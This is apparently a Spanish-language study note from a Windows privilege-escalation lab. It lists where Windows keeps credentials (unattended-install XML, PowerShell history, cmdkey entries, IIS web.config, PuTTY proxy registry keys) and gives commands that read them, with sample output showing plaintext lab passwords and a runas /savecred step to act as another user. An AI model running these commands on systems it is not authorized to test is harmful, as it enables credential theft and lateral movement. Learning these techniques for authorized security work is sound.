# Recopilación de contraseñas en sitios habituales

### Instalaciones desatendidas de Windows

Al instalar Windows en un gran número de hosts, los administradores pueden utilizar los Servicios de Implementación de Windows, que permiten desplegar una única imagen del sistema operativo en varios hosts a través de la red.&#x20;

Este tipo de instalaciones se denominan instalaciones desatendidas, ya que no requieren la interacción del usuario.&#x20;

Este tipo de instalaciones requieren el uso de una cuenta de administrador para realizar la configuración inicial, que puede acabar almacenándose en la máquina en las siguientes ubicaciones:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Ejemplo de credenciales

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

Cada vez que un usuario ejecuta un comando usando Powershell, éste se almacena en un archivo que guarda una memoria de comandos anteriores, al igual que en Linux (.bash\_hstory).

Si un usuario ejecuta un comando que incluye una contraseña directamente como parte de la línea de comandos de Powershell, puede recuperarla posteriormente utilizando el siguiente comando desde una `cmd.exe`:&#x20;

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

<figure><img src="../../.gitbook/assets/Pasted image 20250122181026.png" alt=""><figcaption></figcaption></figure>

> El comando anterior sólo funcionará desde cmd.exe, ya que Powershell no reconocerá `%userprofile%` como una variable de entorno. Para leer el archivo desde Powershell, tendrías que reemplazar `%userprofile%` por `$Env:userprofile`

### Saved Windows Credentials

Windows nos permite utilizar las credenciales de otros usuarios. Esta función también da la opción de guardar estas credenciales en el sistema `cmdkey /list`

```
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\admin
    Type: Domain Password
    User: WPRIVESC1\admin

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz

```

Aunque no puedes ver las contraseñas reales, si observas alguna credencial que merezca la pena probar, puedes utilizarla con el comando `runas` y la opción `/savecred` -->

`runas /savecred /user:WPRIVESC1\mike.katz cmd.exe`

> Esto nos daria una cmd como el User mike.katz

<figure><img src="../../.gitbook/assets/Pasted image 20250122180625.png" alt=""><figcaption></figcaption></figure>

### IIS Configuration

Internet Information Services (IIS) es el servidor web por defecto de Windows. La configuración de los sitios web en IIS se almacena en un fichero llamado `web.config` y puede almacenar contraseñas para bases de datos Dependiendo de la versión instalada de IIS, podemos encontrar `web.config` en una de las siguientes ubicaciones:

`C:\inetpub\wwwroot\web.config` `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

```c
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
    
```

### Recuperar credenciales del software (PuTTY)

PuTTY es un cliente SSH habitual en los sistemas Windows. En lugar de tener que especificar los parámetros de una conexión cada vez, los usuarios pueden almacenar sesiones en las que la IP, el usuario y otras configuraciones pueden almacenarse para volver a utilizarse

PuTTY no permitirá a los usuarios almacenar su contraseña SSH, pero sí almacenará configuraciones de proxy que incluyan credenciales de autenticación en texto claro

Para recuperar las credenciales del proxy almacenadas, puede buscar ProxyPassword en la siguiente clave del registro : `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```
